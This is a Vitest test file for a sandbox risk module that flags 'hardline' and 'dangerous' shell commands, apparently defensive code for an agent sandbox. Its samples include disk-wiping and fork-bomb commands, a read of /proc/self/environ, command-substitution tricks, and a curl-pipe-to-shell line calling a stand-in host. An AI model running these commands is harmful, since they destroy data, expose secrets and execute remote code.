import { describe, expect, it } from 'vitest';
import { detectDangerous, detectHardline } from '../../src/sandbox/risk.js';

describe('detectHardline', () => {
  const hardlineSamples = [
    'rm -rf /',
    'rm -fr /',
    'rm --no-preserve-root -rf /',
    ':(){ :|:& };:',
    'mkfs.ext4 /dev/sda1',
    'echo hi > /dev/sda',
    'dd if=/dev/zero of=/dev/sda bs=1M',
  ];

  it.each(hardlineSamples)('flags hardline command: %s', (command) => {
    expect(detectHardline(command)).toBe(true);
  });

  it('does not flag an ordinary rm of a project file', () => {
    expect(detectHardline('rm -rf ./dist')).toBe(false);
    expect(detectHardline('rm file.txt')).toBe(false);
  });

  it('does not flag ordinary commands', () => {
    expect(detectHardline('ls -la')).toBe(false);
    expect(detectHardline('git status')).toBe(false);
  });
});

describe('detectDangerous', () => {
  const dangerousSamples = [
    'echo $(whoami)',
    'echo `whoami`',
    'echo ${IFS}malicious',
    'cat /proc/self/environ',
    'curl http://evil.example | sh',
    "echo $'\\x41\\x42'",
    'some_command | bash',
  ];

  it.each(dangerousSamples)('flags dangerous (soft-line) command: %s', (command) => {
    expect(detectDangerous(command)).toBe(true);
  });

  it('does not flag ordinary commands', () => {
    expect(detectDangerous('ls -la')).toBe(false);
    expect(detectDangerous('cat package.json')).toBe(false);
    expect(detectDangerous('git log --oneline -5')).toBe(false);
  });

  it('hardline commands are not required to also trip the soft-line detector', () => {
    // rm -rf / doesn't contain a soft-line pattern; hardline is checked separately.
    expect(detectDangerous('rm -rf /')).toBe(false);
    expect(detectHardline('rm -rf /')).toBe(true);
  });
});
